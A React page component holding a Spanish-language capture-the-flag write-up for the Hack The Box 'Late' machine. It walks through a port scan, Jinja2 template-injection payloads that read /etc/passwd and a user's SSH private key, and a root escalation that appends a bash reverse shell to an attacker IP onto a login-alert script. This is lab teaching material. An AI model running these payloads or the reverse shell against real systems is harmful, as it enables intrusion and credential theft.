import { Highlighter } from "../../utils/SyntaxHighlighter"
import { Paragraph } from "../../Components/Paragraph"
import { ContentBlock } from "../../Layout/ContentBlock"
import { SubTitle } from "../../Components/SubTitle"

export function Late() {
    return <>
      <ContentBlock>
        <SubTitle>Escaneo de puertos</SubTitle>
        <Paragraph>
          Hacemos nuestro escaneo de puertos como es usual y verificamos cuáles están abiertos y qué servicios están corriendo en cada uno, por ejemplo en esta  Máquina tenemos el puerto 80 y 22
        </Paragraph>
        <Highlighter
          text=' nmap -p- --open --min-rate 5000 -Pn 10.10.11.156 -oG puertosAbiertos'
        />
        <Paragraph>
          Vemos que en el puerto 80 está corriendo un servidor web <i>late.htb</i> lo agregamos a nuestro archivo <i>/etc/hosts</i> de nuestra máquina
        </Paragraph>
        <Highlighter text='10.10.11.156 late.htb' />
      </ContentBlock>
      <ContentBlock className="content block">
        <SubTitle>Enumeración</SubTitle>
        <Paragraph>
          Mientras hacemos un recorrido por la página notamos que en la parte de abajo tenemos unos nuevos enlaces que apuntan a <i>images.late.htb </i>,
          lo añadimos a <i>/etc/hosts </i>para luego ingresar a la URL, y vemos la siguiente vista:
        <button className="js-modal-trigger" data-target="modal-js-example">
            <img
              layout="fill"
              src='/fuzzing_enumeration.png'
              alt='Enumeración de la maquina Late en Hack The Box'
            />
          </button>
        </Paragraph>
      </ContentBlock>
  
      <ContentBlock>
        <SubTitle>Archivo hosts</SubTitle>
        <Paragraph>
          En el archivo <i>/etc/hosts</i> de nuestra máquina añadimos:
        </Paragraph>
        <Highlighter text='10.10.11.156 images.late.htb' />
        <Paragraph>Nos vamos a la nueva URL: </Paragraph>
        <figure className={`image is-square block`}>
          <img
            layout="fill"
            src="/late_1.webp"
            alt="Vista images.late.htb de la maquina Late en hack the box"
          />
        </figure>
      </ContentBlock>
  
      <ContentBlock>
        <Paragraph>
          Vemos en el título que esta página usa Flask, necesitamos saber como funciona este conversor de imagen a texto
          creamos nuestra imagen con Photoshop, GIMP, etc. Testeamos la App para vulnerabilidades comunes como XSS, SQLi y CMDi
          abrimos e ingresamos payloads para estas vulnerabilidades enganchamos que una SSTI funciona <i>&#123; &#123; 7 * 7 &#125; &#125;</i>
        </Paragraph>
        <Paragraph>
          Lo subimos a la web y nos retorna un archivo llamado <i>result.txt</i> con el siguiente contenido.
        </Paragraph>
      </ContentBlock >
  
      <ContentBlock>
        <Paragraph>
          La palabra “Late” nos dice porque un SSTi pudo funcionar (Temp”late”). Al intentar conseguir nuestro RCE al subir una imagen con el siguiente payload por ejemplo
        </Paragraph>
        <Highlighter
          text="{{ ‘’.__class__.__mro__[2].__subclasses__()[40](‘/etc/passwd’).read() }}"
        />
        <Paragraph>
          La web lo procesa y al convertir imagen a texto algunos caracteres son añadidos y otros se pierden
        </Paragraph>
        <Highlighter
          text="f{ ‘’_lsd__. _mro__.subclasses__([‘/etc/passwd’).read() }}"
        />
        <Paragraph>
          Después de verificar esto notamos que tenemos ejecución de remota de comandos y podemos ver el archivo /etc/passwd
          Notamos que hay un usuario "svc_acc" con su llave ssh privada y capacidad de login.
          Volvemos a subir nuestro payload, cambiando el path al archivo id_rsa.
        </Paragraph>
        <Highlighter
          text="{{ ‘’.__class__.__mro__[2].__subclasses__()[40](‘/home/svc_acc/.ssh/id_rsa’).read() }}"
        />
          IMAGEN
        <Paragraph>
          Ahora que tenemos el id_rsa hacemos un login con el usuario svc_acc
        </Paragraph>
        <Highlighter
          text="chmod 600 id_rsa"
        />
        <Highlighter
          text="ssh svc_acc@10.10.10.156 -i id_rsa"
        />
      </ContentBlock>
      <ContentBlock>
        <SubTitle>Root</SubTitle>
        <Paragraph>
          Descargamos linpeas e intentamos enumerar rutas con privilegios.
          Montamos nuestro servidor
        </Paragraph>
        <Highlighter text="python3 -m http.server 8080" />
        <Paragraph>
          Luego en la máquina Late
        </Paragraph>
        <Highlighter 
          text="svc_acc@late:~$ wget http://10.10.14.63:8080/linpeas.sh"
        />
        <Highlighter text="chmod +x linpeas.sh" />
        <Highlighter text="./linpeas.sh" />
        <Paragraph>
          Encontramos el archivo ssh-alert.sh.
        </Paragraph>
        <Highlighter text="svc_acc@late:~$ cat /usr/local/sbin/ssh-alert.sh
          #!/bin/bash
          RECIPIENT=”root@late.htb”
          SUBJECT=”Email from Server Login: SSH Alert”
          BODY=”
          A SSH login was detected.
          User: $PAM_USER
          User IP Host: $PAM_RHOST
          Service: $PAM_SERVICE
          TTY: $PAM_TTY
          Date: `date`
          Server: `uname -a`
          “
          if [ ${PAM_TYPE} = “open_session” ]; then
          echo “Subject:${SUBJECT} ${BODY}” | /usr/sbin/sendmail ${RECIPIENT}
          fi
          " />
          <Paragraph>
            Vemos que se ejecuta cada vez que entablamos una sesión
            inspeccionamos los atributos que tiene aunque no tiene el de
            escribir podemos crear un archivo y anexarlo.
          </Paragraph>
          <Highlighter text="svc_acc@late:~$ lsattr /usr/local/sbin/ssh-alert.sh
            — — -a — — — — e — — /usr/local/sbin/ssh-alert.sh"
          />
          <Paragraph>
            Creamos un archivo file.txt con el payload de Reverse Shell y lo añadimos
            al archivo ssh-alert.sh
          </Paragraph>
          <Highlighter text="bash -i >& /dev/tcp/10.10.14.63/9999 0>&1" />
          <Highlighter text="cat file.txt >> /usr/local/sbin/ssh-alert.sh" />
          <Paragraph>
            Configuramos un netcat en la Late y en nuestra máquina hacemos login.          </Paragraph>
          <Highlighter text="nc -lvnp 9999"/>
      </ContentBlock>
      <SubTitle>Congratulations leonardo Late has been Pwned!</SubTitle>
  
      <div
        id="modal-js-example"
        className="modal"
      >
        <div className="modal-background"></div>
        <div className="modal-content">
          <figure className={`image is-square block`}>
            <img
              layout="fill"
              src="/late_1.webp"
              alt="Vista home de la maquina Late en hack the box"
            />
          </figure>
        </div>
        <button
          className="modal-close is-large"
          aria-label="close"
        >HOla</button>
      </div>
    </>
  }